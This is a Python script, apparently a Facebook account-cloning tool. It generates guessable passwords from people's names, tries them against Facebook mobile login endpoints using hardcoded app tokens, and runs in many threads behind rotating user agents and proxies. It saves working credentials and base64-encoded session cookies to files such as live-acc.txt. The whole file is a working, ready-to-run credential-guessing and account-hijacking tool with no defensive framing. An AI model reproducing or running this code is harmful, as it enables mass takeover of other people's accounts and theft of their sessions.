
import requests
import random
from concurrent.futures import ThreadPoolExecutor
import json
import base64

def get_user_agents(sort = "Mobile (User-Agents)"):
    try:
        UA = []
        if sort == "Mobile (User-Agents)":
            keys = ['iphone', 'android', 'android 12', 'android 13', 'andorid 11', 'andorid 10', 'andorid 9']
        else:
            keys = ['windows', 'macintosh']
        # key = random.choice(keys)
        with open('user-agents.txt', 'r') as f:
            data = f.read().split("\n")
        for key in keys:
            for ua in data:
                ex = int(ua.lower().find(key))
                if ex > 0:
                    UA.append(ua)
    except Exception as e:
        print(f"Get user agent error: {e}")
        UA = []
    return UA


def convert_cookies(cookies):
    cookies = json.dumps(cookies)
    cookies_string_bytes = cookies.encode("ascii")
    base64_bytes = base64.b64encode(cookies_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    return base64_string

def get_passwords(password):
    fname, lname = password.split(" ")
    passwords = []
    pass1 = f"{fname.lower()} {lname.lower()}"
    pass2 = f"{fname.lower()}{lname.lower()}"
    pass3 = f"{fname.capitalize()} {lname.capitalize()}"
    pass4 = f"{fname.capitalize()}{lname.capitalize()}"
    pass5 = f"{fname}123"
    pass6 = f"{fname}1234"
    pass7 = f"{fname}12345"
    pass8 = f"{fname}143"
    pass9 = f"{fname}1122"
    pass10 = f"{fname}@123"
    pass11 = f"{fname}786"
    pass12 = f"{fname}1010"
    pass13 = f"9876543"
    pass14 = f"987654"
    pass15 = f"203040"
    pass16 = f"304050"
    pass17 = f"506070"
    pass18 = f"607080"
    pass19 = f"708090"
    pass20 = f"121314"
    pass21 = f"{fname}121"
    
    passwords.append(pass1)
    passwords.append(pass2)
    passwords.append(pass3)
    passwords.append(pass4)
    passwords.append(pass5)
    passwords.append(pass6)
    passwords.append(pass7)
    passwords.append(pass8)
    passwords.append(pass9)
    passwords.append(pass10)
    passwords.append(pass11)
    passwords.append(pass12)
    passwords.append(pass13)
    passwords.append(pass14)
    passwords.append(pass15)
    passwords.append(pass16)
    passwords.append(pass17)
    passwords.append(pass18)
    passwords.append(pass19)
    passwords.append(pass20)
    passwords.append(pass21)
    
    return passwords
    
    
def login(username, password, user_agents, proxy = None):
    b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
    flag = False
    USER_AGENT = random.choice(user_agents)
    head = {"user-agent": USER_AGENT, "Content-Type": "application/json;charset=utf-8", "Content-Length": "599",
                "Host": "graph.facebook.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
    
    try:
        if proxy:
            proxy = proxy.split(":")
            host = proxy[0]
            port = proxy[1]
            proxusername = proxy[2]
            proxpassword = proxy[3]
            proxies = {
                'http': f"http://{proxusername}:{proxpassword}@{host}:{port}",
                'https': f"http://{proxusername}:{proxpassword}@{host}:{port}"
            }
            flag = True
    except Exception as e: 
        print(f"proxy get error: {e}")
    
    
    passwords = get_passwords(password)
    
    for password in passwords:
        params = {
            'access_token': b,
            'format': 'JSON',
            'sdk_version': '2',
            'email': username,
            'locale': 'en_US',
            'password': password,
            'sdk': 'ios',
            'generate_session_cookies': '1',
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        
        if flag:
            response = requests.get(api, params=params, proxies=proxies)
        else:
            response = requests.get(api, params=params)
        if 'EAA' in response.text:
            print(f"\r\033[1;92m  Live * --> {username}|{password}                       ", end="")
            print()
            res = response.json()
            cookies = convert_cookies(res['session_cookies'])
            with open('/storage/emulated/0/live-acc.txt', 'a', encoding="utf-8") as f:
                f.write(f"\n{username}|{password}||{cookies}")
            break
        elif 'www.facebook.com' in response.json()['error_msg']:
            print(f"\r\033[1;93m  Checkpoint* --> {username}|{password}                    ", end="")
            print()
            with open("cp_1.txt", 'a', encoding="utf8") as f:
                f.write(f"\n{username}|{password}")
        else:
            print(f"\r\033[1;93m  Die* --> {username}|{password}                    ", end="")
            print()
            with open("/storage/emulated/0/die-login.txt", 'a', encoding="utf8") as f:
                f.write(f"\n{username}|{password}")
        # with open("mixx5.txt", 'r+', encoding="utf8") as f:
        #     all_data = f.read()
        #     all_data = all_data.replace(f"{username}|{password}\n", "")
        #     f.write(all_data)


def login_with_request(username, password,user_agents, proxy= None):
    flag = False
    
    try:
        if proxy:
            proxy = proxy.split(":")
            host = proxy[0]
            port = proxy[1]
            proxusername = proxy[2]
            proxpassword = proxy[3]
            proxies = {
                'http': f"http://{proxusername}:{proxpassword}@{host}:{port}",
                'https': f"http://{proxusername}:{proxpassword}@{host}:{port}"
            }
            flag = True
    except Exception as e: 
        print(f"proxy get error: {e}")

    if user_agents:
        USER_AGENT = random.choice(user_agents)
        # print(f"User agent random choise.")
    else:
        # print(f"User agent fixed choise.")
        USER_AGENT = "Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36"
    # print(USER_AGENT)
    url = 'https://b-graph.facebook.com/auth/login'
    
    
    passwords = get_passwords(password)
    
    for password in passwords:
        
        head = {"user-agent": USER_AGENT, "Content-Type": "application/json;charset=utf-8", "Content-Length": "599",
                "Host": "graph.facebook.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
        data = {"locale": "en_US", "format": "json", "email": username, "password": password,
                "access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28", "generate_session_cookies": 1}
        if flag:
            
            res = requests.post("https://graph.facebook.com/auth/login", data=data, headers=head, proxies=proxies).json()
        else:
            res = requests.post("https://graph.facebook.com/auth/login", data=data, headers=head).json()
        if 'access_token' in res:
            print(f"\r\033[1;92m  Live * --> {username}|{password}                       ", end="")
            print()
            cookies = convert_cookies(res['session_cookies'])
            with open('/storage/emulated/0/live-acc.txt', 'a', encoding="utf-8") as f:
                f.write(f"\n{username}|{password}||{cookies}")
            break
        else:
            print(f"\r\033[1;93m  Die* --> {username}|{password}                    ", end="")
            print()
            with open("/storage/emulated/0/die-login.txt", 'a', encoding="utf8") as f:
                f.write(f"\n{username}|{password}")
        
        # with open("mixx5.txt", 'r+', encoding="utf8") as f:
        #     all_data = f.read()
        #     all_data = all_data.replace(f"{username}|{password}\n", "")
        #     f.write(all_data)
   
   
   
   
   
   
   
   
   
   
   
    
def main():
    print("welcome to request clone")
    method = int(input("1. Start clone slow\n2. Start clone fast\ninput: "))
    prox = int(input("1 for normal mode and 2 for http/https proxy mode: "))
    file_name = input("Enter the file name: ")
    if prox == 2:
        with open("proxy.txt", 'r', encoding="utf8") as f:
            proxies = f.read().split("\n")
    else:
        proxies = []
        
        
    threads = int(input("number of threads: "))
    print("getting user agents...")
    user_agents = get_user_agents()
    print("getting dummy data...")
    with open(file_name, 'r', encoding="utf8") as f:
        all_data = f.read().split("\n")


    print("starting clone...")
    with ThreadPoolExecutor(max_workers=threads) as thread:
        print("clone started")
        print("Login with proxy..")
        cnt = 0
        for data in all_data:
            id,passw = data.split("|")
            
            if method == 1:
                if prox == 2:
                    thread.submit(login, id,passw, user_agents, proxies[cnt])
                else:
                    thread.submit(login, id,passw, user_agents)
            else:
                if prox == 2:
                    thread.submit(login_with_request, id,passw, user_agents, proxies[cnt])
                else:
                    thread.submit(login_with_request, id,passw, user_agents)
            
            cnt += 1
            if len(proxies)-1 == cnt:
                cnt = 0
            
            # login(id,passw)



if __name__ == "__main__":
    main()